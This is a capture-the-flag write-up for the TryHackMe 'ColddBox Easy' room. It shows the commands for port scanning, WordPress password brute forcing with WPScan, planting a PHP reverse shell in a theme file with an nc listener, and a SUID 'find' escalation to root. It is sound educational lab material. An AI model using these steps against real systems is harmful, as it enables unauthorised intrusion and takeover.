---
title: "ColddBox Easy - TryHackMe"
date: 2026-03-25 11:38:00 +0000
categories: [TryHackMe, Writeups]
tags: [brute-force, gobuster, ctf, privilege-escalation]
image: /assets/img/writeups/covers/colddbox-easy.png
---
# ColddBox Easy - TryHackMe
![1.png](/assets/img/writeups/colddbox-easy/1.png)
**Difficulty**: Easy <br>**Time Required** : 30 min
## Reconnaissance
Started with an Nmap scan to identify open ports and services: `nmap -p- 10.67.160.222 -sV -T4`
````
$ nmap -p- 10.67.160.222 -sV -T4   
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-26 04:40 +0500
Nmap scan report for 10.67.160.222 (10.67.160.222)
Host is up (0.23s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.12 seconds
````
### Findings
- Port 22 → SSH
- Port 80 → HTTP (Web Server)

## Web Enumeration
Visiting the web server:
````
http://10.67.160.222
````
We are presented with a **WordPress website**.
- No major vulnerabilities found initially
- Identified a login page (/wp-login.php)

## Directory Bruteforcing
Performed directory enumeration using Gobuster:
```
$ gobuster dir -u 10.67.160.222 -w /usr/share/wordlists/dirb/common.txt -t 60
```
![1.png](/assets/img/writeups/colddbox-easy/2.png)
Discovered a hidden directory `/hidden`.
## User Enumeration
Visiting `/hidden` reveals a message containing usernames:
![1.png](/assets/img/writeups/colddbox-easy/3.png)
- C0ldd
- Hugo
- Philip

These users likely exist on the WordPress instance.
## Brute Force Attack
Used WPScan to brute force credentials:
````
$ wpscan -U C0ldd -P /usr/share/wordlists/rockyou.txt --url http://10.67.160.222/wp-login.php
````
![1.png](/assets/img/writeups/colddbox-easy/4.png)
Valid credentials found for user C0ldd.
## Gaining Initial Access
Logged into the WordPress admin panel:
````
http://10.67.160.222/wp-admin
````
![1.png](/assets/img/writeups/colddbox-easy/5.png)
### Finding
- Found Theme Editor functionality
- Allows modification of PHP files

## Reverse Shell
Injected a PHP reverse shell using [pentestmonkey php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
- Updated IP and port in the shell
- Uploaded into theme file (404.php)

![1.png](/assets/img/writeups/colddbox-easy/11.png)
**Listener Setup**
````
$ nc -lvnp 4444
````
**Trigger Shell**
````
$ http://10.67.160.222/wp-content/themes/twentyfifteen/404.php
````
![1.png](/assets/img/writeups/colddbox-easy/6.png)
## Privilege Escalation
Attempted to access `user.txt` within the home directory but lacked permissions.
````
$ cat user.txt
cat: user.txt: Permission denied
````
### SUID Enumeration
SUID (Set User ID) binaries run with the privileges of the file owner (often root), which can be abused for privilege escalation.

```
$ find / -perm -u=s -type f 2>/dev/null
```
![1.png](/assets/img/writeups/colddbox-easy/7.png)
Found SUID binary: `find`
![1.png](/assets/img/writeups/colddbox-easy/12.png)
Checked GTFOBins for find.<br>**Exploit**:
````
$ find . -exec /bin/sh -p \; -quit
````
![1.png](/assets/img/writeups/colddbox-easy/8.png)
Root shell obtained.
### Flags Captured
- [x] user.txt
- [x] root.txt
